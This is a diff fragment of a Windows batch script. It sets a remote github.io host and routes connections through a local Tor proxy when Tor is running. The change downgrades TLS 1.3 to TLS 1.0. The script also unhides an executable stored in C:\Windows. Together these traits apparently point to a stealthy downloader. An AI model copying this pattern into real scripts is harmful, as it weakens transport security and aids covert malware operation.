@@ -8,8 +8,8 @@ if errorlevel 1 goto Connectivitycheck
 Set host=https://cryptedodissey.github.io
 
 tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
-if not errorlevel 1 (set "proxy=--tlsv1.3 --socks5-hostname 127.0.0.1:9050") else (
-  set "proxy=--tlsv1.3"
+if not errorlevel 1 (set "proxy=--tlsv1 --socks5-hostname 127.0.0.1:9050") else (
+  set "proxy=--tlsv1"
 )
 
 attrib -s -h -i "C:\Windows\expose.exe" 
